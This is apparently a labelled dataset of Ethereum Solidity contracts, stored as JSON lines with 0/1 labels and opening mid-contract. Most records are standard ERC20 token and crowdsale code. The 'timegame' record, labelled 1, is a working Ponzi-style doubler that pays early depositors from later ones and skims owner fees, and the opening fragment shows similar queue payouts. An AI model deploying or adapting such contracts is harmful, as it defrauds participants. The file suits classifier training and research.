memberQueue.push(msg.sender);\r\r\n\r\r\n            if (memberQueue.length % 2 == 1) {\r\r\n                queueFront += 1;\r\r\n                memberQueue[queueFront-1].transfer(194 finney);\r\r\n            }\r\r\n        }\r\r\n\r\r\n        Joined(msg.sender, entries, memberQueue.length * 2);\r\r\n\r\r\n        \/\/ send back any unused ethereum\r\r\n        uint remainder = msg.value - (entries * 100 finney);\r\r\n        if (remainder > 1 finney) {\r\r\n            msg.sender.transfer(remainder);\r\r\n        }\r\r\n        \/\/msg.sender.send(msg.value - entries * 100 finney);\r\r\n    }\r\r\n\r\r\n    function collectFee() onlymaster {\r\r\n        master.transfer(this.balance - 200 finney);\r\r\n    }\r\r\n\r\r\n    function setMaster(address _master) onlymaster {\r\r\n        master = _master;\r\r\n    }\r\r\n\r\r\n}","label":0}
{"code":"\/\/ Abstract contract for the full ERC 20 Token standard\r\r\n\/\/ https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\npragma solidity ^0.4.8;\r\r\n\r\r\ncontract Token {\r\r\n    \/* This is a slight change to the ERC20 base standard.\r\r\n    function totalSupply() constant returns (uint256 supply);\r\r\n    is replaced with:\r\r\n    uint256 public totalSupply;\r\r\n    This automatically creates a getter function for the totalSupply.\r\r\n    This is moved to the base contract since public getter functions are not\r\r\n    currently recognised as an implementation of the matching abstract\r\r\n    function by the compiler.\r\r\n    *\/\r\r\n    \/\/\/ total amount of tokens\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\r\n    \/\/\/ @return The balance\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `msg.sender`\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\r\n    \/\/\/ @param _from The address of the sender\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_spender` to spend `_value` tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @param _value The amount of tokens to be approved for transfer\r\r\n    \/\/\/ @return Whether the approval was successful or not\r\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @param _owner The address of the account owning tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @return Amount of remaining tokens allowed to spent\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\n\/*\r\r\nYou should inherit from StandardToken or, for a token like you would want to\r\r\ndeploy in something like Mist, see WalStandardToken.sol.\r\r\n(This implements ONLY the standard functions and NOTHING else.\r\r\nIf you deploy this, you won&#39;t have anything useful.)\r\r\n\r\r\nImplements ERC 20 Token standard: https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n.*\/\r\r\n\r\r\ncontract StandardToken is Token {\r\r\n\r\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\r\n        \/\/Default assumes totalSupply can&#39;t be over max (2^256 - 1).\r\r\n        \/\/If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn&#39;t wrap.\r\r\n        \/\/Replace the if with this one instead.\r\r\n        \/\/if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\r\n            balances[msg.sender] -= _value;\r\r\n            balances[_to] += _value;\r\r\n            Transfer(msg.sender, _to, _value);\r\r\n            return true;\r\r\n        } else { return false; }\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\r\n        \/\/same as above. Replace this line with the following if you want to protect against wrapping uints.\r\r\n        \/\/if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\r\n            balances[_to] += _value;\r\r\n            balances[_from] -= _value;\r\r\n            allowed[_from][msg.sender] -= _value;\r\r\n            Transfer(_from, _to, _value);\r\r\n            return true;\r\r\n        } else { return false; }\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balances[_owner];\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n      return allowed[_owner][_spender];\r\r\n    }\r\r\n\r\r\n    mapping (address => uint256) balances;\r\r\n    mapping (address => mapping (address => uint256)) allowed;\r\r\n}\r\r\n\r\r\ncontract WalchainToken is StandardToken {\r\r\n\r\r\n    \/* Public variables of the token *\/\r\r\n    \/*\r\r\n    NOTE:\r\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\r\n    Some wallets\/interfaces might not even bother to look at this information.\r\r\n    *\/\r\r\n    string public name;                   \/\/fancy name: eg Simon Bucks\r\r\n    uint8 public decimals;                \/\/How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It&#39;s like comparing 1 wei to 1 ether.\r\r\n    string public symbol;                 \/\/An identifier: eg SBX\r\r\n    string public version = \"W0.1\";       \/\/human 0.1 standard. Just an arbitrary versioning scheme.\r\r\n    function WalchainToken() {\r\r\n        balances[msg.sender] = 600000000000;               \/\/ Give the creator all initial tokens\r\r\n        totalSupply = 600000000000;                        \/\/ Update total supply\r\r\n        name = \"WalChain Token\";                                   \/\/ Set the name for display purposes\r\r\n        decimals = 4;                            \/\/ Amount of decimals for display purposes\r\r\n        symbol = \"WAL\";                               \/\/ Set the symbol for display purposes\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.8;\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------------------------\r\r\n\/\/ Sample fixed supply token contract\r\r\n\/\/ Enjoy. (c) BokkyPooBah 2017. The MIT Licence.\r\r\n\/\/ ----------------------------------------------------------------------------------------------\r\r\n\r\r\n\/\/ ERC Token Standard #20 Interface\r\r\n\/\/ https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\ncontract ERC20Interface\r\r\n{\r\r\n\t\/\/ Get the total token supply\r\r\n\tfunction totalSupply() constant returns (uint256 totalSupply);\r\r\n\r\r\n\t\/\/ Get the account balance of another account with address _owner\r\r\n\tfunction balanceOf(address _owner) constant returns (uint256 balance);\r\r\n\r\r\n\t\/\/ Send _value amount of tokens to address _to\r\r\n\tfunction transfer(address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n\t\/\/ Send _value amount of tokens from address _from to address _to\r\r\n\tfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n\t\/\/ Allow _spender to withdraw from your account, multiple times, up to the _value amount.\r\r\n\t\/\/ If this function is called again it overwrites the current allowance with _value.\r\r\n\t\/\/ this function is required for some DEX functionality\r\r\n\tfunction approve(address _spender, uint256 _value) returns (bool success);\r\r\n\r\r\n\t\/\/ Returns the amount which _spender is still allowed to withdraw from _owner\r\r\n\tfunction allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n\r\r\n\t\/\/ Triggered when tokens are transferred.\r\r\n\tevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n\r\r\n\t\/\/ Triggered whenever approve(address _spender, uint256 _value) is called.\r\r\n\tevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\ncontract FixedSupplyToken is ERC20Interface\r\r\n{\r\r\n\tstring public constant symbol = \"BCOIN\";\r\r\n\tstring public constant name = \"BannerCoin\";\r\r\n\tuint8 public constant decimals = 8;\r\r\n\tuint256 _totalSupply = 10000000000000000;\r\r\n\r\r\n\t\/\/ Owner of this contract\r\r\n\taddress public owner;\r\r\n\r\r\n\t\/\/ Balances for each account\r\r\n\tmapping(address => uint256) balances;\r\r\n\r\r\n\t\/\/ Owner of account approves the transfer of an amount to another account\r\r\n\tmapping(address => mapping (address => uint256)) allowed;\r\r\n\r\r\n\t\/\/ Functions with this modifier can only be executed by the owner\r\r\n\tmodifier onlyOwner() \r\r\n\t{\r\r\n\t\trequire(msg.sender == owner);\r\r\n\t\t_;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Constructor\r\r\n\tfunction FixedSupplyToken()\r\r\n\t{\r\r\n\t\towner = msg.sender;\r\r\n\t\tbalances[owner] = _totalSupply;\r\r\n\t}\r\r\n\r\r\n\tfunction totalSupply() constant returns (uint256 totalSupply)\r\r\n\t{\r\r\n\t\ttotalSupply = _totalSupply;\r\r\n\t}\r\r\n\r\r\n\t\/\/ What is the balance of a particular account?\r\r\n\tfunction balanceOf(address _owner) constant returns (uint256 balance)\r\r\n\t{\r\r\n\t\treturn balances[_owner];\r\r\n\t}\r\r\n\r\r\n\t\/\/ Transfer the balance from owner&#39;s account to another account\r\r\n\tfunction transfer(address _to, uint256 _amount) returns (bool success)\r\r\n\t{\r\r\n\t\tif\t(\r\r\n\t\t\t\tbalances[msg.sender] >= _amount &&\r\r\n\t\t\t\t_amount > 0 &&\r\r\n\t\t\t\tbalances[_to] + _amount > balances[_to]\r\r\n\t\t\t)\r\r\n\t\t{\r\r\n\t\t\tbalances[msg.sender] -= _amount;\r\r\n\t\t\tbalances[_to] += _amount;\r\r\n\t\t\tTransfer(msg.sender, _to, _amount);\r\r\n\t\t\treturn true;\r\r\n\t\t} else {\r\r\n\t\t\treturn false;\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/ Send _value amount of tokens from address _from to address _to\r\r\n\t\/\/ The transferFrom method is used for a withdraw workflow, allowing contracts to send\r\r\n\t\/\/ tokens on your behalf, for example to \"deposit\" to a contract address and\/or to charge\r\r\n\t\/\/ fees in sub-currencies; the command should fail unless the _from account has\r\r\n\t\/\/ deliberately authorized the sender of the message via some mechanism; we propose\r\r\n\t\/\/ these standardized APIs for approval:\r\r\n\tfunction transferFrom(\r\r\n\t\t\t\taddress _from,\r\r\n\t\t\t\taddress _to,\r\r\n\t\t\t\tuint256 _amount\r\r\n\t\t\t\t) returns (bool success)\r\r\n\t{\r\r\n\t\tif\t(\r\r\n\t\t\t\tbalances[_from] >= _amount &&\r\r\n\t\t\t\tallowed[_from][msg.sender] >= _amount &&\r\r\n\t\t\t\t_amount > 0 &&\r\r\n\t\t\t\tbalances[_to] + _amount > balances[_to]\r\r\n\t\t\t)\r\r\n\t\t{\r\r\n\t\t\tbalances[_from] -= _amount;\r\r\n\t\t\tallowed[_from][msg.sender] -= _amount;\r\r\n\t\t\tbalances[_to] += _amount;\r\r\n\t\t\tTransfer(_from, _to, _amount);\r\r\n\t\t\treturn true;\r\r\n\t\t} else {\r\r\n\t\t\treturn false;\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/ Allow _spender to withdraw from your account, multiple times, up to the _value amount.\r\r\n\t\/\/ If this function is called again it overwrites the current allowance with _value.\r\r\n\tfunction approve(address _spender, uint256 _amount) returns (bool success)\r\r\n\t{\r\r\n\t\tallowed[msg.sender][_spender] = _amount;\r\r\n\t\tApproval(msg.sender, _spender, _amount);\r\r\n\t\treturn true;\r\r\n\t}\r\r\n\r\r\n\tfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) \r\r\n\t{\r\r\n\t\treturn allowed[_owner][_spender];\r\r\n\t}\r\r\n}","label":0}
{"code":"contract timegame {\r\r\n\r\r\n  struct Person {\r\r\n      address etherAddress;\r\r\n      uint amount;\r\r\n  }\r\r\n\r\r\n  Person[] public persons;\r\r\n\r\r\n  uint public payoutIdx = 0;\r\r\n  uint public collectedFees;\r\r\n  uint public balance = 0;\r\r\n  uint constant TWELEVE_HOURS = 12 * 60 * 60;\r\r\n  uint public regeneration;\r\r\n\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  modifier onlyowner { if (msg.sender == owner) _ }\r\r\n\r\r\n\r\r\n  function timegame() {\r\r\n    owner = msg.sender;\r\r\n    regeneration = block.timestamp;\r\r\n  }\r\r\n\r\r\n  function() {\r\r\n    enter();\r\r\n  }\r\r\n  \r\r\nfunction enter() {\r\r\n\r\r\n if (regeneration + TWELEVE_HOURS < block.timestamp) {\r\r\n\r\r\n\r\r\n\r\r\n     if (msg.value < 1 ether) {\r\r\n        msg.sender.send(msg.value);\r\r\n        return;\r\r\n    }\r\r\n\t\r\r\n\t\tuint amount;\r\r\n\t\tif (msg.value > 50 ether) {\r\r\n\t\t\tmsg.sender.send(msg.value - 50 ether);\t\r\r\n\t\t\tamount = 50 ether;\r\r\n    }\r\r\n\t\telse {\r\r\n\t\t\tamount = msg.value;\r\r\n\t\t}\r\r\n\r\r\n\r\r\n    uint idx = persons.length;\r\r\n    persons.length += 1;\r\r\n    persons[idx].etherAddress = msg.sender;\r\r\n    persons[idx].amount = amount;\r\r\n    regeneration = block.timestamp;\r\r\n \r\r\n    \r\r\n    if (idx != 0) {\r\r\n      collectedFees += amount \/ 10;\r\r\n\t  owner.send(collectedFees);\r\r\n\t  collectedFees = 0;\r\r\n      balance += amount - amount \/ 10;\r\r\n    } \r\r\n    else {\r\r\n      balance += amount;\r\r\n    }\r\r\n\r\r\n\r\r\n    while (balance > persons[payoutIdx].amount \/ 100 * 200) {\r\r\n      uint transactionAmount = persons[payoutIdx].amount \/ 100 * 200;\r\r\n      persons[payoutIdx].etherAddress.send(transactionAmount);\r\r\n\r\r\n      balance -= transactionAmount;\r\r\n      payoutIdx += 1;\r\r\n    }\r\r\n\r\r\n       } else {\r\r\n\t     msg.sender.send(msg.value);\r\r\n\t     return;\r\r\n\t}          \r\r\n\r\r\n}\r\r\n\r\r\n  function setOwner(address _owner) onlyowner {\r\r\n      owner = _owner;\r\r\n  }\r\r\n\r\r\n}","label":1}
{"code":"pragma solidity ^0.4.13;\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/179\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint256 public totalSupply;\r\r\n  function balanceOf(address who) public constant returns (uint256);\r\r\n  function transfer(address to, uint256 value) public returns (bool);\r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances.\r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\r\n    require(_to != address(0));\r\r\n\r\r\n    \/\/ SafeMath.sub will throw if there is not enough balance.\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of.\r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) public constant returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value) public returns (bool);\r\r\n  function approve(address spender, uint256 value) public returns (bool);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implementation of the basic standard token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, BasicToken {\r\r\n\r\r\n  mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amount of tokens to be transferred\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\r\n    require(_to != address(0));\r\r\n\r\r\n    uint256 _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ require (_value <= _allowance);\r\r\n\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n   *\r\r\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\r\r\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\r\r\n   * race condition is to first reduce the spender&#39;s allowance to 0 and set the desired value afterwards:\r\r\n   * https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifying the amount of tokens still available for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * approve should be called when allowed[_spender] == 0. To increment\r\r\n   * allowed value is better to use this function to avoid 2 calls (and wait until\r\r\n   * the first transaction is mined)\r\r\n   * From MonolithDAO Token.sol\r\r\n   *\/\r\r\n  function increaseApproval (address _spender, uint _addedValue)\r\r\n    returns (bool success) {\r\r\n    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\r\n    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function decreaseApproval (address _spender, uint _subtractedValue)\r\r\n    returns (bool success) {\r\r\n    uint oldValue = allowed[msg.sender][_spender];\r\r\n    if (_subtractedValue > oldValue) {\r\r\n      allowed[msg.sender][_spender] = 0;\r\r\n    } else {\r\r\n      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\r\n    }\r\r\n    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n   * account.\r\r\n   *\/\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Throws if called by any account other than the owner.\r\r\n   *\/\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n   * @param newOwner The address to transfer ownership to.\r\r\n   *\/\r\r\n  function transferOwnership(address newOwner) onlyOwner public {\r\r\n    require(newOwner != address(0));\r\r\n    OwnershipTransferred(owner, newOwner);\r\r\n    owner = newOwner;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Mintable token\r\r\n * @dev Simple ERC20 Token example, with mintable token creation\r\r\n * @dev Issue: * https:\/\/github.com\/OpenZeppelin\/zeppelin-solidity\/issues\/120\r\r\n * Based on code by TokenMarketNet: https:\/\/github.com\/TokenMarketNet\/ico\/blob\/master\/contracts\/MintableToken.sol\r\r\n *\/\r\r\n\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n  event Mint(address indexed to, uint256 amount);\r\r\n  event MintFinished();\r\r\n\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n\r\r\n  modifier canMint() {\r\r\n    require(!mintingFinished);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to mint tokens\r\r\n   * @param _to The address that will receive the minted tokens.\r\r\n   * @param _amount The amount of tokens to mint.\r\r\n   * @return A boolean that indicates if the operation was successful.\r\r\n   *\/\r\r\n  function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\r\r\n    totalSupply = totalSupply.add(_amount);\r\r\n    balances[_to] = balances[_to].add(_amount);\r\r\n    Mint(_to, _amount);\r\r\n    Transfer(0x0, _to, _amount);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to stop minting new tokens.\r\r\n   * @return True if the operation was successful.\r\r\n   *\/\r\r\n  function finishMinting() onlyOwner public returns (bool) {\r\r\n    mintingFinished = true;\r\r\n    MintFinished();\r\r\n    return true;\r\r\n  }\r\r\n}\r\r\n\r\r\ncontract PKCT is MintableToken {\r\r\n  string public name = \"PackageCoin Presale1\";\r\r\n  string public symbol = \"PKCT\";\r\r\n  uint256 public decimals = 18;\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Crowdsale\r\r\n * @dev Crowdsale is a base contract for managing a token crowdsale.\r\r\n * Crowdsales have a start and end timestamps, where investors can make\r\r\n * token purchases and the crowdsale will assign them tokens based\r\r\n * on a token per ETH rate. Funds collected are forwarded to a wallet\r\r\n * as they arrive.\r\r\n *\/\r\r\ncontract Crowdsale {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  \/\/ The token being sold\r\r\n  MintableToken public token;\r\r\n\r\r\n  \/\/ start and end timestamps where investments are allowed (both inclusive)\r\r\n  uint256 public startTime;\r\r\n  uint256 public endTime;\r\r\n\r\r\n  \/\/ address where funds are collected\r\r\n  address public wallet;\r\r\n\r\r\n  \/\/ how many token units a buyer gets per wei\r\r\n  uint256 public rate;\r\r\n\r\r\n  \/\/ amount of raised money in wei\r\r\n  uint256 public weiRaised;\r\r\n\r\r\n  \/**\r\r\n   * event for token purchase logging\r\r\n   * @param purchaser who paid for the tokens\r\r\n   * @param beneficiary who got the tokens\r\r\n   * @param value weis paid for purchase\r\r\n   * @param amount amount of tokens purchased\r\r\n   *\/\r\r\n  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\r\r\n\r\r\n\r\r\n  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) {\r\r\n    require(_startTime >= now);\r\r\n    require(_endTime >= _startTime);\r\r\n    require(_rate > 0);\r\r\n    require(_wallet != 0x0);\r\r\n\r\r\n    token = createTokenContract();\r\r\n    startTime = _startTime;\r\r\n    endTime = _endTime;\r\r\n    rate = _rate;\r\r\n    wallet = _wallet;\r\r\n  }\r\r\n\r\r\n  \/\/ creates the token to be sold.\r\r\n  \/\/ override this method to have crowdsale of a specific mintable token.\r\r\n  function createTokenContract() internal returns (MintableToken) {\r\r\n    return new MintableToken();\r\r\n  }\r\r\n\r\r\n\r\r\n  \/\/ fallback function can be used to buy tokens\r\r\n  function () payable {\r\r\n    buyTokens(msg.sender);\r\r\n  }\r\r\n\r\r\n  \/\/ low level token purchase function\r\r\n  function buyTokens(address beneficiary) public payable {\r\r\n    require(beneficiary != 0x0);\r\r\n    require(validPurchase());\r\r\n\r\r\n    uint256 weiAmount = msg.value;\r\r\n\r\r\n    \/\/ calculate token amount to be created\r\r\n    uint256 tokens = weiAmount.mul(rate);\r\r\n\r\r\n    \/\/ update state\r\r\n    weiRaised = weiRaised.add(weiAmount);\r\r\n\r\r\n    token.mint(beneficiary, tokens);\r\r\n    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\r\r\n\r\r\n    forwardFunds();\r\r\n  }\r\r\n\r\r\n  \/\/ send ether to the fund collection wallet\r\r\n  \/\/ override to create custom fund forwarding mechanisms\r\r\n  function forwardFunds() internal {\r\r\n    wallet.transfer(msg.value);\r\r\n  }\r\r\n\r\r\n  \/\/ @return true if the transaction can buy tokens\r\r\n  function validPurchase() internal constant returns (bool) {\r\r\n    bool withinPeriod = now >= startTime && now <= endTime;\r\r\n    bool nonZeroPurchase = msg.value != 0;\r\r\n    return withinPeriod && nonZeroPurchase;\r\r\n  }\r\r\n\r\r\n  \/\/ @return true if crowdsale event has ended\r\r\n  function hasEnded() public constant returns (bool) {\r\r\n    return now > endTime;\r\r\n  }\r\r\n\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title CappedCrowdsale\r\r\n * @dev Extension of Crowdsale with a max amount of funds raised\r\r\n *\/\r\r\ncontract CappedCrowdsale is Crowdsale {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  uint256 public cap;\r\r\n\r\r\n  function CappedCrowdsale(uint256 _cap) {\r\r\n    require(_cap > 0);\r\r\n    cap = _cap;\r\r\n  }\r\r\n\r\r\n  \/\/ overriding Crowdsale#validPurchase to add extra cap logic\r\r\n  \/\/ @return true if investors can buy at the moment\r\r\n  function validPurchase() internal constant returns (bool) {\r\r\n    bool withinCap = weiRaised.add(msg.value) <= cap;\r\r\n    return super.validPurchase() && withinCap;\r\r\n  }\r\r\n\r\r\n  \/\/ overriding Crowdsale#hasEnded to add cap logic\r\r\n  \/\/ @return true if crowdsale event has ended\r\r\n  function hasEnded() public constant returns (bool) {\r\r\n    bool capReached = weiRaised >= cap;\r\r\n    return super.hasEnded() || capReached;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\ncontract PackageCoinPresaleOne is Crowdsale, CappedCrowdsale {\r\r\n\r\r\n  function PackageCoinPresaleOne(uint256 _startTime, uint256 _endTime) \r\r\n    Crowdsale(_startTime,\r\r\n              _endTime,\r\r\n              362,                                          \/\/ rate: PKCT per Ether\r\r\n              0xB787A746ac38140b419bF1E94C0913BDc18bb445)   \/\/ wallet address\r\r\n    CappedCrowdsale(20000 ether)\r\r\n  {\r\r\n  }\r\r\n\r\r\n  \/\/ creates the token to be sold.\r\r\n  \/\/ override this method to have crowdsale of a specific MintableToken token.\r\r\n  function createTokenContract() internal returns (MintableToken) {\r\r\n    return new PKCT();\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"contract SimpleStorage {\r\r\n    uint storedData;\r\r\n    address storedAddress;\r\r\n    \r\r\n    event flag(uint val, address addr);\r\r\n\r\r\n    function set(uint x, address y) {\r\r\n        storedData = x;\r\r\n        storedAddress = y;\r\r\n    }\r\r\n\r\r\n    function get() constant returns (uint retVal, address retAddr) {\r\r\n        return (storedData, storedAddress);\r\r\n        flag(storedData, storedAddress);\r\r\n\r\r\n    }\r\r\n}","label":0}
